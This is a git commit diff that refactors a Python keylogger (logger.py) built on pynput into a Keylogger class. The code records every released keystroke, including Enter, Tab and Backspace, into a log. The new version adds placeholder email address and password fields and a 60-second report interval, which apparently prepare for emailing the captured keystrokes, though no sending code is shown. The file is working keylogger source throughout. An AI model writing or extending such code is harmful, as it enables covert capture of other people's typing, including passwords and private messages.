f66fcd8bcca6fb8ef1caf0a31585c8fff1d5bab7
R, Alex <alex.richardson19@imperial.ac.uk>
2021-08-06 08:29:51 +0100

    refactor(logger.py): Change to `Keylogger` class

--- logger.py
+++ logger.py
@@ -1,32 +1,46 @@
 from pynput.keyboard import Key, Controller, Listener
-
-keyboard = Controller()
-# write for easy debugging
-f = open("log.txt", "w")
-
-ks = {
-    Key.space: " ",
-    Key.enter: "[ENTER]\n",
-    Key.tab: "[TAB]",
-    Key.backspace: "[BACKSPACE]"}
+# from threading import Timer
+# from datetime import datetime
 
 
-def on_release(key):
-    try:
-        name = key.char
-    except AttributeError:
-        name = ks.get(key, str(key))
-    # print(f"Key {key} pressed")
-    if key == Key.esc:
-        # stop listener
-        return False
-    f.write(name.replace("'", ""))
+class Keylogger:
+    EMAIL_ADDRESS = "YOUR_EMAIL"
+    EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"
+    SEND_REPORT_EVERY = 60  # as in seconds
+    ks = {
+        Key.space: " ",
+        Key.enter: "[ENTER]\n",
+        Key.tab: "[TAB]",
+        Key.backspace: "[BACKSPACE]"}
+
+    def __init__(self, time_interval):
+        self.interval = time_interval
+        self.log = ""
+        self.email = Keylogger.EMAIL_ADDRESS
+        self.password = Keylogger.EMAIL_PASSWORD
+
+    def update_log(self, str):
+        self.log += str
+
+    def on_release(self, key):
+        try:
+            name = key.char
+        except AttributeError:
+            name = Keylogger.ks.get(key, str(key))
+        if key == Key.esc:
+            # stop listener
+            return False
+        self.update_log(name.replace("'", ""))
+
+    def start(self):
+        # collect events until released
+        with Listener(on_release=self.on_release) as listener:
+            listener.join()
 
 
 def main():
-    # collect events until released
-    with Listener(on_release=on_release) as listener:
-        listener.join()
+    kl = Keylogger(60)
+    kl.start()
 
 
 if __name__ == "__main__":
